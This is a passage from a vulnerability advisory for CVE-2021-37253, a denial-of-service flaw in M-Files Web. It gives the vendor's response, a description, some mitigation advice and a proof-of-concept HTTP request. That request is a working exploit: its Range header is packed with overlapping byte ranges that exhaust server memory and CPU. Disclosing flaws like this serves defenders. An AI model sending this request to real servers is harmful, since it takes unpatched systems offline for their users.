and ask time to fix)
Vendor (M-Files) Reply: the 4th of August, 2021 (inform me that "we're
accepting this vulnerability but we'll not give an effort to fix that and
also will not apply any CVE for this vuln.")

IV. DESCRIPTION & MITIGATION
=============================================================================================================================================================
M-Files Web version before 20.10.9524.1 and M-Files Web version before
20.10.9445.0 contain an Improper Range Header Processing Vulnerability. A
remote unauthenticated attacker may send crafted requests with overlapping
ranges (via HTTP requests with a specially-crafted Range or Request-Range
headers) to cause the web application to compress each of the requested
bytes, resulting in a crash due to excessive memory and CPU consumption and
preventing users from accessing the system.

Even if this vulnerability (CVE-2021-37253) has been verified and accepted
by the Vendor (M-Files), their security team also contacted me and informed
me that no effort will be given to fixing this vulnerability. Thus, there
is no active patch, update or mitigation plan for CVE-2021-37253
vulnerability. These are not exactly fix the problem (maybe just
remediation), however I strongly recommend you to restrict IP addresses for
web applications which incoming requests/clients or reconfigure the web
server for "Byte-range Request Segment Size" as soon as possible.
=============================================================================================================================================================

V. PROOF OF CONCEPT (POC) FOR CVE-2021-37253
=============================================================================================================================================================
This is easy to detect and exploit for this vulnerability. Just find a
static content (such as .png, .jpg, .jpeg, .js, .css and so on) and make a
request as follows.

GET /Icons/Standard/Listing/VaultMounting.png HTTP/1.1
Host: <host>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0)
Gecko/20100101 Firefox/79.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Range:
bytes=0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-,0-

Note: this issue is valid and easly reproducable for all static assests
(which has .png, .jpg, .jpeg, .js, .css, .gif extensions and so on)
